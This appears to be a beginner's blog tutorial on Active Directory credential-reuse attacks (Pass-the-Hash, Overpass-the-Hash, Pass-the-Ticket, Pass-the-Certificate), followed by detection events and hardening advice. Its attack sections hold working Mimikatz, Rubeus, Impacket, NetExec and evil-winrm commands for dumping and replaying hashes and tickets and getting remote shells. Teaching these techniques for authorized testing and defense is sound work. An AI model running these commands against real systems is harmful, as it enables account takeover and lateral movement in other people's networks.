---
title: "Pass-the-X Attacks in Active Directory: A Beginner's Guide"
description: "A hands-on introduction to the credential-reuse attacks that let you authenticate as another user without ever knowing their password: Pass-the-Hash, Overpass-the-Hash, and Pass-the-Ticket."
tags:
  - active-directory
  - pentesting
  - kerberos
  - ntlm
  - lateral-movement
  - red-team
date: 2026-07-28
draft: false
---

> [!warning] Authorized testing only
> Everything below is written for people learning offensive security so they can attack and defend systems they own or are explicitly authorized to test. Running these techniques against systems you don't have written permission to test is a crime in most of the world. Spin up a lab (there are suggestions at the bottom) and stay legal.

If you've spent any time around Active Directory pentesting, you've heard someone say *"you don't need the password."* That single idea is the heart of the **Pass-the-X** family of attacks. Once you've pulled a hash or a ticket out of a machine, you can often authenticate as that user across the network without ever cracking anything.

This post breaks the whole family down for beginners: what each attack is, *why* it works, and the exact tools and commands you'll reach for. By the end you should be able to look at a dumped hash and know your options.

## First, two ways AD proves who you are

Every Pass-the-X attack is really just *abusing how authentication works*. So before the attacks make sense, you need a working mental model of the two protocols AD uses.

### NTLM in one minute

NTLM is a **challenge-response** protocol. The important part for us: your password is never sent over the wire, and the server never checks your *password* directly. It checks your **NT hash**, the MD4 of your password (no salt, which is why hashes are so reusable).

The flow, simplified:

1. Client says "I want to log in as Alice."
2. Server sends a random **challenge**.
3. Client encrypts the challenge using **Alice's NT hash** and sends the result back.
4. Server (or the DC) verifies it.

Notice what's missing: **the plaintext password is never needed.** If you hold Alice's NT hash, you can complete this exchange. That's Pass-the-Hash in a nutshell, but we'll get there.

### Kerberos in two minutes

Kerberos is the default in a domain and works with **tickets** instead of challenge-response. The Domain Controller runs the **KDC** (Key Distribution Center), which issues tickets.

The flow, simplified:

1. **AS-REQ / AS-REP**: The client proves who it is (by encrypting a timestamp with its key, which is *derived from the password*) and receives a **TGT** (Ticket-Granting Ticket). The TGT is your "I'm authenticated" pass, encrypted with the `krbtgt` account's secret so only the DC can read it.
2. **TGS-REQ / TGS-REP**: The client presents the TGT to ask for a **service ticket (TGS)** for a specific service (an SPN, like `cifs/fileserver`).
3. **AP-REQ**: The client presents that service ticket to the service and gets access.

The user's Kerberos key can be their **RC4 key (which is literally their NT hash)** or an **AES128/AES256 key** derived from the password plus a salt. Remember that RC4-key = NT-hash detail, it's why one stolen hash unlocks both NTLM *and* Kerberos.

### Where the secrets live

All these juicy secrets: NT hashes, Kerberos tickets, sometimes cached credentials, sit in the memory of the **LSASS** process (`lsass.exe`) on a machine, plus the local **SAM** database and the **NTDS.dit** file on a DC. Tools like **Mimikatz** read them straight out of LSASS memory. Getting local admin / SYSTEM on a box is usually what lets you dump these in the first place, Pass-the-X is what you do *after* you've grabbed them.

## The family at a glance

| Attack | What you steal | What you get back | Protocol abused |
|---|---|---|---|
| **Pass-the-Hash (PtH)** | NT hash | Auth as that user | NTLM |
| **Overpass-the-Hash / Pass-the-Key** | NT hash or AES key | A real Kerberos TGT | Kerberos |
| **Pass-the-Ticket (PtT)** | An existing TGT/TGS | Reuse of that ticket | Kerberos |

They overlap a lot. The rule of thumb: **hashes feed NTLM (PtH) or get upgraded into Kerberos (Overpass), while stolen tickets get replayed directly (PtT).**

## Pass-the-Hash (PtH)

**The idea:** You have a user's NT hash. Since NTLM only ever needed the hash, you authenticate as that user, no cracking, no plaintext.

**When it shines:** Local admin accounts reused across machines, or a domain account whose hash you dumped from one box that also has rights elsewhere. Classic lateral movement.

You'll often see hashes written as `LM:NT`. Modern systems don't store LM hashes, so the LM half is usually the "empty" value `aad3b435b51404eeaad3b435b51404ee`. You can pass the full `LM:NT` pair or just the NT half.

```bash
# NetExec: spray a hash across a host (or a whole subnet)
nxc smb 192.168.56.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:<NThash>

# Just the NT hash works too
nxc smb 192.168.56.0/24 -u Administrator -H <NThash> --local-auth

# Impacket: get a shell
psexec.py -hashes :<NThash> CORP/Administrator@192.168.56.10
wmiexec.py -hashes :<NThash> CORP/Administrator@192.168.56.10   # quieter than psexec

# evil-winrm: if WinRM (5985) is open
evil-winrm -i 192.168.56.10 -u Administrator -H <NThash>
```

On Windows, Mimikatz can spawn a process with the hash injected into a fresh logon session:

```
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NThash> /run:cmd.exe
```

> [!note] The local-account gotcha
> Passing a *local* admin hash to a remote machine can be blocked by UAC remote restrictions (`LocalAccountTokenFilterPolicy`). The built-in `Administrator` (RID 500) is usually still fair game, and **domain** accounts with local admin aren't affected. If a local account with admin rights gets denied, that policy is why.

## Overpass-the-Hash / Pass-the-Key

**The idea:** Instead of using the NT hash for NTLM, you use it to request a legitimate **Kerberos TGT**. You've "upgraded" a hash into a ticket. When you use an **AES key** instead of the RC4/NT hash, the precise name is **Pass-the-Key**.

**Why bother if PtH already works?** Two reasons:

1. Some environments disable or heavily monitor NTLM. Kerberos blends in.
2. Requesting a TGT with **RC4** (the NT hash) can trip "encryption downgrade" detections. Using the **AES256 key** looks like normal traffic and is much stealthier.

```powershell
# Rubeus (Windows): request a TGT with the NT hash (RC4) and inject it
Rubeus.exe asktgt /user:jdoe /domain:corp.local /rc4:<NThash> /ptt

# Stealthier: use the AES256 key instead of RC4
Rubeus.exe asktgt /user:jdoe /domain:corp.local /aes256:<aes256key> /ptt
```

```bash
# Impacket (Linux): same idea, saves a ccache file
getTGT.py -hashes :<NThash> corp.local/jdoe
export KRB5CCNAME=jdoe.ccache
psexec.py -k -no-pass corp.local/jdoe@target.corp.local
```

The `/ptt` flag ("pass the ticket") tells Rubeus to inject the new TGT straight into your current session, which is a nice segue.

## Pass-the-Ticket (PtT)

**The idea:** Rather than building a ticket from a hash, you **steal a ticket that already exists** in memory and replay it. Could be a TGT (full access as that user) or a single service ticket (access to one service).

**When it shines:** A privileged user has logged into a box you control and left tickets in LSASS. Grab them, become them.

**Step 1: dump tickets:**

```
# Mimikatz: export every ticket in memory to .kirbi files
sekurlsa::tickets /export
```

```powershell
# Rubeus: dump tickets as base64
Rubeus.exe dump /nowrap
```

**Step 2: inject and use:**

```
# Mimikatz
kerberos::ptt [0;12bd0]-2-0-40e10000-jdoe@krbtgt-CORP.LOCAL.kirbi
```

```powershell
# Rubeus
Rubeus.exe ptt /ticket:<base64-blob-or-path.kirbi>
```

On Linux, tickets live in **ccache** format. Point the `KRB5CCNAME` variable at the file and the Impacket / NetExec tools will use it:

```bash
export KRB5CCNAME=/tmp/jdoe.ccache
nxc smb target.corp.local -k --use-kcache
```

## Where Golden and Silver tickets fit

You'll hear "Golden Ticket" and "Silver Ticket" in the same breath as these. Here's the clean distinction for beginners:

- **Pass-the-Ticket** = *replaying a real ticket* you stole.
- **Golden / Silver tickets** = *forging a fake ticket* from a stolen key, then passing it (using the same PtT injection).

A **Golden Ticket** is a forged TGT signed with the domain's `krbtgt` hash: game over for the domain. A **Silver Ticket** is a forged service ticket signed with a single service account's key: access to one service, but very quiet since the DC never sees it. Both are *forgery* attacks that happen to use Pass-the-Ticket as their delivery mechanism. Worth their own post: file them under "next steps."

## Bonus: Pass-the-Certificate

If you've been reading up on **AD CS**, there's one more: authenticating via a **certificate** (PKINIT) to obtain a TGT. Steal or maliciously enroll a cert for a user, and you can request their TGT without any hash at all.

```powershell
Rubeus.exe asktgt /user:jdoe /certificate:<base64-pfx> /password:<pfx-pw> /ptt
```

```bash
# Certipy (Linux)
certipy auth -pfx jdoe.pfx -dc-ip 192.168.56.2
```

This is the payoff for a lot of the ESC1–ESC8 certificate-template abuses. Definitely intermediate territory, but good to know it's part of the same "get a ticket without a password" idea.

## How defenders catch these

Detection mostly comes down to watching Windows Security logs for the *shape* of these attacks:

- **4624** (logon): watch for **Logon Type 9** (NewCredentials) paired with a `seclogo` process, a classic `sekurlsa::pth` fingerprint.
- **4768 / 4769** (TGT and service-ticket requests): flag **RC4 encryption (type 0x17)** where your environment should be using AES. Encryption downgrades are a strong signal for Overpass-the-Hash.
- **4776** (NTLM validation): spikes or NTLM auth from hosts that shouldn't be using it.
- **Behavioral tells**: a ticket used from a *different* machine than the one it was issued to, or a user authenticating to hosts they never normally touch.

A good EDR plus something like a SIEM correlation rule catches most of the noisy variants.

## How defenders stop these

- **Credential Guard**: virtualization-based protection that keeps LSASS secrets out of reach of Mimikatz.
- **LSASS as a Protected Process (RunAsPPL)**: raises the bar for memory dumping.
- **Protected Users group**: for members, no NTLM, no RC4, no delegation, and short TGT lifetimes. Kills a lot of these attacks outright for your privileged accounts.
- **LAPS**: unique, rotating local admin passwords so one dumped hash doesn't open every machine (kills lateral PtH).
- **Tiered admin model**: don't let Domain Admins log into workstations where their tickets can be harvested.
- **Enforce AES, disable RC4**: removes the RC4/NT-hash shortcut for Kerberos.
- **Rotate the `krbtgt` password** (twice) periodically: limits Golden Ticket lifespan.
- **Disable NTLM** where you can.

## Practice safely

You need a lab. Some solid options:

- **[GOAD](https://github.com/Orange-Cyberparis/GOAD)** (Game of Active Directory): a deliberately vulnerable multi-domain forest, purpose-built for exactly these attacks.
- **TCM Security's Practical Ethical Hacking / PNPT track**: walks the AD attack chain end to end.
- **Hack The Box** Pro Labs (Dante, and the AD-focused labs) and various retired machines.

Start by dumping a hash with Mimikatz in your lab, then work through PtH → Overpass → PtT with the same account so you *feel* how they relate.

## Key takeaways

- AD authentication doesn't always need a password: a **hash** or a **ticket** is often enough.
- **Pass-the-Hash** abuses NTLM; **Overpass-the-Hash / Pass-the-Key** upgrades a hash into Kerberos; **Pass-the-Ticket** replays a stolen ticket.
- Prefer **AES over RC4** when you want to stay quiet.
- **Golden/Silver tickets** are *forgery* attacks that ride on Pass-the-Ticket.
- Defenders win with **Credential Guard, LAPS, the Protected Users group, AES enforcement, and tiering.**

---

*Found this useful? It's part of the ping-sec Active Directory series. Next up: forging your way in with Golden and Silver tickets.*
